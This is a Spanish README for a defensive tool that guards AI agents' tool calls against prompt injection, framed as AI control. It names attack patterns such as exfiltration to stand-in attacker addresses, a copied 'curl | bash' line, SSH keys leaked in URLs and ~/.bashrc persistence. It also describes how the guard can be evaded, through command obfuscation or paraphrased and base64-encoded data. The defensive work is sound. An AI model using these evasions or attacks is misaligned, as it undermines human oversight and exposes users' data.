# tool-call-guard

Guardián de llamadas a herramientas para agentes LLM: una capa **determinista** entre el agente y
sus herramientas que

1. **marca de dónde vienen los datos**: no fiables (una web, un email, un issue) o privados
   (claves, `.env`, bandeja de entrada, bases de datos);
2. **bloquea o pide confirmación humana** cuando esos datos acaban en acciones sensibles (shell,
   envío de correo, pagos, publicar, borrar, escribir ficheros), con la evidencia concreta de qué
   argumento viene de qué fuente;
3. **guarda un registro de auditoría** encadenado por hashes (con HMAC opcional) y verificable.

Se integra con **Claude Code** (hooks), con **cualquier cliente MCP** (proxy stdio) y con agentes
propios (API Python o CLI). Sin dependencias en tiempo de ejecución; Python ≥ 3.11.

```text
toolguard: BLOCK mcp__gmail__send_email (sink: send)
- [tainted] the session has read untrusted data from mcp__gmail__search_emails [message; untrusted, private]
- [untrusted_flow] critical argument(s) to carry data copied from an untrusted source
    arg 'to' indicator match 'archive@invoice-audit.example' from mcp__gmail__search_emails [message; untrusted, private]
- [trifecta] untrusted input and private data are both in context and this action sends data out
```

## Índice

- [Por qué: AI control](#por-qué-ai-control)
- [Cómo funciona](#cómo-funciona)
- [Instalación](#instalación)
- [Integraciones](#integraciones): [Claude Code](#claude-code-hooks) · [MCP](#cualquier-cliente-mcp-proxy-stdio) · [Python](#api-python) · [CLI](#cli-genérica)
- [Aprobaciones fuera de banda](#aprobaciones-fuera-de-banda)
- [Auditoría](#auditoría)
- [Políticas](#políticas)
- [Evaluación: seguridad frente a utilidad](#evaluación-seguridad-frente-a-utilidad)
- [Modelo de amenazas](#modelo-de-amenazas)
- [Limitaciones](#limitaciones)
- [Desarrollo](#desarrollo)

## Por qué: AI control

La investigación en *AI control* parte de una premisa incómoda: no podemos garantizar que el modelo
se comporte bien, ya sea porque un contenido inyectado lo ha secuestrado (*prompt injection*) o
porque persigue otro objetivo. En lugar de intentar que el modelo "se porte", se diseñan
**protocolos de control** externos que mantienen la seguridad aunque el modelo intente
subvertirlos, y se miden con un compromiso explícito entre **seguridad** y **utilidad** bajo un
**presupuesto de auditoría humana** limitado (Greenblatt et al., *AI Control: Improving Safety
Despite Intentional Subversion*, 2023).

Este proyecto es un protocolo de ese tipo aplicado al límite de acción del agente:

| Concepto de AI control | En toolguard |
|---|---|
| Modelo no confiable | El LLM y todo lo que lee; nada de lo que dice cambia una decisión |
| Monitor de confianza | Política determinista + rastreo de procedencia, fuera del modelo |
| Auditoría humana con presupuesto | `CONFIRM` por un canal que el modelo no controla; se mide en confirmaciones por tarea |
| *Defer to trusted* / rechazo | `BLOCK` con explicación devuelta al modelo |
| Integridad del protocolo | Reglas de autoprotección: el agente no puede aprobarse, resetear el estado ni editar la política o los hooks |
| Evaluación seguridad/utilidad | `toolguard eval`: ataques prevenidos/marcados/fallados frente a tareas autónomas/con humano/rotas |

Se inspira además en el control de flujo de información para agentes (CaMeL, *Defeating Prompt
Injections by Design*, 2025; FIDES, *Securing AI Agents with Information-Flow Control*, 2025) y en
la "trifecta letal" (datos privados + contenido no fiable + capacidad de enviar fuera) descrita por
Simon Willison. A diferencia de esos diseños, toolguard **no requiere reescribir el agente**: se
acopla a agentes existentes a través de hooks o de un proxy, a cambio de una atribución heurística
(ver [Limitaciones](#limitaciones)).

## Cómo funciona

```text
            user prompt (trusted, endorses values)
                    |
   +-----------+    v    +-----------------------------------------------+
   |   agent   |-------->|  toolguard                                    |
   |   (LLM)   |  call   |  1. sink?  (shell, send, payment, publish...) |
   +-----------+         |  2. session taint / private data seen?        |
         ^               |  3. which argument came from which source?    |----> tool
         |    result     |  4. policy -> allow | confirm | block         |
         +---------------|  5. record source outputs (observations)      |<---- result
                         +-----------------------------------------------+
                            |                     |                 |
                      approval channel       audit chain      shared state
                      (human, out of band)   (hash/HMAC)      (SQLite, per session)
```

**Fuentes** (`[[source]]`): herramientas cuyo resultado es *no fiable* (`WebFetch`, búsquedas,
navegadores, email, Slack, issues, documentos compartidos) y/o *privado* (`Read` de rutas como
`~/.ssh/*` o `.env`, gestores de contraseñas, bases de datos, email). Cada resultado se guarda como
**observación**: texto normalizado (NFKC, sin caracteres invisibles) e **indicadores** extraídos
(URLs, dominios, emails, IPs, IBAN con checksum, direcciones cripto, teléfonos).

**Sumideros** (`[[sink]]`): herramientas sensibles con una **categoría** (`shell`, `send`,
`payment`, `publish`, `destructive`, `web`, `write`), sus **argumentos críticos** (`to`, `iban`,
`command`, `file_path`...) y si son de **salida** (`egress`).

**Reglas**: para cada sumidero se evalúan cuatro condiciones y se aplica la acción más restrictiva:

| Regla | Condición | Ejemplo |
|---|---|---|
| `tainted` | la sesión ha leído datos no fiables (grueso, siempre correcto) | Bash después de leer una web |
| `untrusted_flow` | un argumento crítico **contiene** datos vistos en una fuente no fiable | `to` = dirección que aparece en el email del atacante |
| `private_flow` | un argumento lleva datos privados (literal, fragmento o token con forma de secreto) | trozo de `id_ed25519` en la query de una URL |
| `trifecta` | no fiable + privado en la sesión, y el sumidero envía datos fuera | responder un email tras leer la bandeja |

La **evidencia** se busca por indicadores, coincidencia literal, fragmentos de ≥ 4 tokens
consecutivos y tokens de alta entropía. Si el valor también aparece en lo que escribió el usuario,
se considera **avalado** (`endorsed_flow`) y no se atribuye a la fuente no fiable. Las
**reglas de autoprotección** bloquean siempre, sin opción de aprobar, que el agente invoque
`toolguard`, toque `~/.toolguard/` o edite `.claude/settings*.json`.

## Instalación

```bash
git clone <url-del-repo> tool-call-guard && cd tool-call-guard
python -m venv .venv && source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install .
toolguard policy            # resumen del preset por defecto
toolguard eval              # banco de escenarios
```

El estado compartido vive en `~/.toolguard/guard.db` (`TOOLGUARD_HOME` para cambiarlo); contiene
copias de contenido no fiable y privado y se crea con permisos solo para el propietario.

## Integraciones

### Claude Code (hooks)

```bash
toolguard install claude-code [--policy ruta/a/politica.toml] > toolguard-hooks.json
```

Fusiona el JSON resultante en `~/.claude/settings.json` (todos los proyectos) o en
`.claude/settings.json`. Un único comando atiende todos los eventos:

| Evento | Qué hace toolguard |
|---|---|
| `UserPromptSubmit` | Guarda el prompt como entrada de confianza (avala valores) |
| `PostToolUse` | Registra el resultado si la herramienta es una fuente |
| `PreToolUse` | `BLOCK` → `deny` (el motivo lo ve Claude); `CONFIRM` → `ask` (el motivo lo ve **el usuario** en el diálogo de permisos de Claude Code) |
| `SessionStart` (`clear`) | El contexto se vació: resetea el *taint* de la sesión |

Detalles de diseño:

- Nunca devuelve `allow`, que se saltaría los permisos normales. Si no hay objeción, no emite nada
  y Claude Code sigue su flujo habitual.
- En los modos de permiso en que nadie contestaría (`bypassPermissions`, `dontAsk`, `auto`), un
  `CONFIRM` se convierte en `deny`. Un clasificador u otro modelo no cuenta como humano.
  Configurable con `--ask-modes`.
- **Falla cerrado**: cualquier error interno en `PreToolUse` sale con código 2, que Claude Code
  trata como bloqueo. Un código 1 dejaría pasar la llamada.
- En Windows, la shell de Claude Code puede ser `PowerShell`; las políticas la tratan igual que
  `Bash`.
- `--annotate` añade al contexto del modelo una nota de que el resultado procede de una fuente no
  fiable. Es una defensa blanda adicional; no sustituye a la política.
- Si tu versión de Claude Code admite `"onFailure": "block"` en los hooks, añádelo: por defecto un
  hook que agota su tiempo no bloquea.

### Cualquier cliente MCP (proxy stdio)

Sustituye el comando de cada servidor por el proxy (ejemplo completo en
[`examples/claude-desktop-mcp.json`](examples/claude-desktop-mcp.json)):

```json
"gmail": {
  "command": "toolguard",
  "args": ["mcp-proxy", "--server-name", "gmail", "--session", "desktop", "--",
           "npx", "-y", "@example/gmail-mcp@1.4.0"]
}
```

- Las llamadas se evalúan como `mcp__<server-name>__<tool>`, la misma convención que Claude Code,
  así que los presets valen para cualquier cliente.
- Una llamada bloqueada nunca llega al servidor: el proxy responde con un resultado `isError` que
  explica el motivo al modelo.
- Para las confirmaciones usa **elicitation** de MCP si el cliente la soporta (pregunta al usuario
  en la interfaz del cliente). Si no, deja la solicitud en cola (ver más abajo).
- Todos los proxies con el mismo `--session` comparten el *taint*: un correo leído con un servidor
  cuenta cuando sus datos llegan a otro.

### API Python

```python
from toolguard import ConsoleApprover, Guard, Policy, ToolBlocked

guard = Guard(Policy.load("balanced"), session="run-42", approver=ConsoleApprover())
guard.observe_user(user_prompt)

@guard.wrap("mcp__mail__send_email")      # comprueba antes, registra el resultado después
def send_email(to, body): ...

try:
    send_email("attacker@evil.example", "...")
except ToolBlocked as blocked:
    print(blocked.decision.explain())
```

Ejemplo ejecutable: [`examples/python_api.py`](examples/python_api.py). También están `guard.check`,
`guard.observe` y `guard.evaluate` (decisión pura, sin efectos).

### CLI genérica

Para otros frameworks que puedan ejecutar un comando antes y después de cada herramienta:

```bash
toolguard observe WebFetch --session s1 < page.txt
toolguard check mcp__mail__send_email --args '{"to": "x@y.example"}' --session s1 --json
# exit 0 = permitido, 1 = bloqueado/denegado, 3 = aprobación pendiente, 2 = error de uso
```

## Aprobaciones fuera de banda

La pieza crítica desde el punto de vista de control: **una aprobación nunca puede venir de algo que
el modelo pueda escribir o invocar**. Canales disponibles:

| Canal | Uso |
|---|---|
| Diálogo de permisos de Claude Code (`ask`) | Integración por hooks |
| Elicitation MCP | Proxy, si el cliente la soporta |
| Terminal de control (`ConsoleApprover`) | Lee de `/dev/tty` o de `CONIN$`/`CONOUT$`, no de stdin/stdout |
| Cola + `toolguard approve <id>` | Proxy sin elicitation, CLI genérica |
| `CallbackApprover` | Tu propia interfaz |

Con la cola, la llamada se rechaza indicando un id; una persona ejecuta `toolguard approvals -v`
para ver la evidencia y `toolguard approve <id>` (o `deny`), y el agente reintenta la **llamada
idéntica**. La aprobación está ligada a la huella exacta (herramienta + argumentos), es de un solo
uso y caduca a los 10 minutos. `approve`, `deny` y `reset` exigen una terminal interactiva y una
confirmación escrita en ella, y las reglas de autoprotección impiden que el agente las ejecute
desde su shell.

## Auditoría

Cada decisión, observación, aprobación y reset queda registrado con los argumentos **redactados**
(tokens conocidos enmascarados, valores largos truncados con hash). Cada registro incluye el hash
del anterior:

```bash
toolguard audit verify          # recalcula la cadena; imprime el hash "head"
toolguard audit tail -n 20
toolguard audit export -o audit.jsonl
```

Editar, reordenar o borrar un registro intermedio rompe la cadena. Con `TOOLGUARD_AUDIT_KEY` la
cadena usa HMAC-SHA256: quien pueda escribir la base de datos pero no tenga la clave no puede
rehacerla. Truncar el final solo se detecta comparando con un `head` guardado fuera del alcance del
agente.

## Políticas

Presets incluidos:

| Categoría | `balanced`: tainted / untrusted_flow / private_flow / trifecta | `strict` |
|---|---|---|
| payment | confirm / **block** / confirm / confirm | confirm / block / block / block |
| send | confirm / **block** / confirm / confirm | confirm / block / block / block |
| shell | confirm / confirm / confirm / confirm | confirm / block / block / block (y cuenta como egress) |
| publish | confirm / confirm / **block** / confirm | confirm / block / block / block |
| destructive | confirm / **block** / confirm / confirm | confirm / block / confirm / block |
| web | allow / allow / **block** / confirm | confirm / confirm / block / block |
| write | allow / confirm / allow / allow | confirm / block / allow / confirm |

Una política propia suele extender un preset y describir tus herramientas; sus reglas tienen
prioridad sobre las del preset. Ejemplo completo:
[`examples/team-policy.toml`](examples/team-policy.toml).

```toml
extends = "balanced"
taint_ttl = 28800            # olvidar el taint 8 h después (0 = hasta reset)

[[source]]
kind = "wiki"
untrusted = true
tools = ["mcp__confluence__*"]

[[sink]]
category = "deploy"
critical = ["environment", "service", "image"]
tools = ["mcp__deployer__*"]

[actions.deploy]
tainted = "confirm"
untrusted_flow = "block"
```

`toolguard policy <fichero>` valida y resume una política; `--monitor` (o `mode = "monitor"`)
registra lo que se habría bloqueado sin bloquear nada, útil para ajustar antes de activarla.

## Evaluación: seguridad frente a utilidad

`toolguard eval` reproduce trayectorias de agente con guion: 9 ataques por inyección y 10 tareas
benignas, incluidos como datos del paquete. Mide cuántos ataques se previenen sin intervención,
cuántos se marcan para un humano y cuántos pasan, frente a cuántas tareas legítimas siguen siendo
autónomas, necesitan un humano o se rompen.

```text
policy       | attacks: prevented flagged missed  |  benign: autonomous human broken  | confirms/scen.
allow-all    |                  0       0      9  |                  10     0      0  |           0.00
taint-only   |                  1       8      0  |                   3     7      0  |           0.89
balanced     |                  6       3      0  |                   5     5      0  |           0.42
strict       |                  9       0      0  |                   3     3      4  |           0.26
```

Lectura:

- **taint-only** pide un humano para cada acción sensible tras leer algo no fiable. Es correcto
  pero caro: 7 de 10 tareas legítimas necesitan intervención, y la seguridad depende de que el
  humano detecte el ataque en 8 de 9 casos.
- **balanced** usa la evidencia de flujo para bloquear sin humano 6 de 9 ataques: destinatario e
  IBAN del atacante, clave SSH en una URL, secretos en un comentario público, autoaprobación y
  borrado de un repo. Los otros 3 se escalan a un humano con la evidencia a la vista, y reduce a la
  mitad la carga de revisión.
- **strict** previene los 9, pero rompe 4 tareas legítimas: responder a un email, pagar una factura
  conocida, clonar el repo de un README y publicar en el mismo canal.
- Los 3 ataques que `balanced` solo marca son los que muestran el límite de la atribución
  heurística: un comando `curl | bash` copiado (las tareas legítimas también copian comandos de la
  documentación), un destinatario **parafraseado** (`ceo dot backup at protonmail dot com`) que no
  deja rastro literal y una ruta a `~/.bashrc`.

Los números son ilustrativos, no un resultado de investigación: los escenarios son pocos, están
escritos a mano junto a la política y no modelan un atacante adaptativo. El banco sirve como test
de regresión del compromiso entre seguridad y utilidad y como base para evaluaciones más serias,
por ejemplo con trazas reales o con *benchmarks* tipo AgentDojo.

## Modelo de amenazas

**Activos**: credenciales y datos privados accesibles desde la máquina; capacidad de actuar en
nombre del usuario (enviar, pagar, publicar, ejecutar, borrar); integridad del registro y de las
aprobaciones.

**Límites de confianza**:

| De confianza | No confiable |
|---|---|
| El proceso de toolguard, su política y su directorio de estado | El modelo y todo lo que genera |
| Lo que el usuario escribe en su prompt | Resultados de herramientas fuente (web, email, issues, documentos) |
| El humano en el canal de aprobación | Servidores MCP de terceros y sus respuestas |

**Adversarios**: el autor de un contenido que el agente leerá (página web, email, issue, documento,
mensaje de chat), y un modelo que actúe contra el usuario por cualquier motivo.

**Amenazas cubiertas**: exfiltración a destinatarios o URLs controlados por el atacante; pagos a
cuentas inyectadas; comandos copiados de fuentes no fiables; publicación de secretos; acciones
destructivas dictadas por terceros; persistencia (`~/.bashrc`); autoaprobación y manipulación del
guardián o de sus hooks; borrado o edición del registro (detectable).

**Fuera de alcance**: aislar la ejecución (no es un sandbox: complementa a los permisos y al
aislamiento del agente); ataques que no pasan por herramientas (por ejemplo, convencer al usuario
de algo en el texto de la respuesta); verificar la identidad de los servidores MCP.

## Limitaciones

- **La atribución es heurística.** Detecta datos copiados (indicadores, literales, fragmentos), no
  parafraseados, traducidos o recodificados (base64, deletreo). Esos casos solo los cubre la regla
  gruesa `tainted`, que por eso existe y por defecto pide un humano para las acciones sensibles.
- **Solo ve lo que pasa por él.** Con hooks ve las herramientas de Claude Code y las MCP; con el
  proxy, solo los servidores que envuelve. Datos no fiables que entren por otra vía no marcan la
  sesión.
- **El prompt del usuario se considera de confianza.** Si el usuario pega un email o una web en su
  prompt, ese contenido avala valores en lugar de marcarlos.
- **El taint es por sesión y persiste** hasta `reset`, `/clear` o `taint_ttl`. Tras compactar el
  contexto se mantiene, de forma conservadora.
- **Mismo usuario del sistema que el agente.** Las reglas de autoprotección se basan en patrones y
  se pueden evadir ofuscando el comando (por ejemplo, `t''oolguard`). Un agente con shell
  arbitraria podría, en principio, modificar `~/.toolguard`. Para garantías fuertes, el estado y
  la clave HMAC deben quedar fuera de su alcance (otro usuario del sistema, un contenedor o un
  servicio remoto); el registro HMAC al menos hace la manipulación detectable.
- **Canales de aprobación**: dependen de que exista un humano (terminal, diálogo de Claude Code,
  elicitation en el cliente). Si no lo hay, toolguard deniega. Un humano que aprueba sin leer anula
  la protección; la evidencia se muestra precisamente para reducir ese riesgo.
- **Rendimiento**: cada observación se limita a 256 KiB de texto normalizado y la búsqueda es
  lineal sobre las observaciones de la sesión. Sesiones muy largas con muchas lecturas crecen en
  coste.
- **Claude Code**: el adaptador sigue el contrato de hooks documentado (octubre de 2026) y se prueba
  con eventos simulados y ejecutando el comando real como subproceso, no dentro de una sesión de
  Claude Code. Los nombres y el formato de las herramientas pueden cambiar entre versiones.

## Desarrollo

```bash
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
pytest --cov                     # incluye el banco como test de regresión
ruff check src tests && ruff format --check src tests
```

CI: [`.gitlab-ci.yml`](.gitlab-ci.yml) (lint, tests en Python 3.11–3.13, cobertura ≥ 90 % y banco
como artefacto) y [`.github/workflows/ci.yml`](.github/workflows/ci.yml) para un futuro espejo en
GitHub (añade Windows y macOS, con las Actions fijadas por SHA).

```text
src/toolguard/
  guard.py          motor: observe / check / evaluate / reset / wrap
  policy.py         carga y validación de políticas TOML (+ presets/)
  provenance.py     indicadores, coincidencias, secretos, aval del usuario
  approvals.py      canales de aprobación (consola, cola, callback, deny)
  store.py          estado SQLite compartido entre procesos
  audit.py          cadena de auditoría (SHA-256 / HMAC), verificación, exportación
  redact.py         redacción de secretos para registros y explicaciones
  adapters/         claude_code.py (hooks), mcp_proxy.py (proxy stdio)
  evaluation.py     banco seguridad/utilidad (+ scenarios/)
  cli.py            toolguard ...
tests/              pytest: núcleo, adaptadores, proxy con servidor MCP falso, CLI, banco
examples/           política de equipo, configuración MCP, uso desde Python
```

## Licencia

[Apache License 2.0](LICENSE).
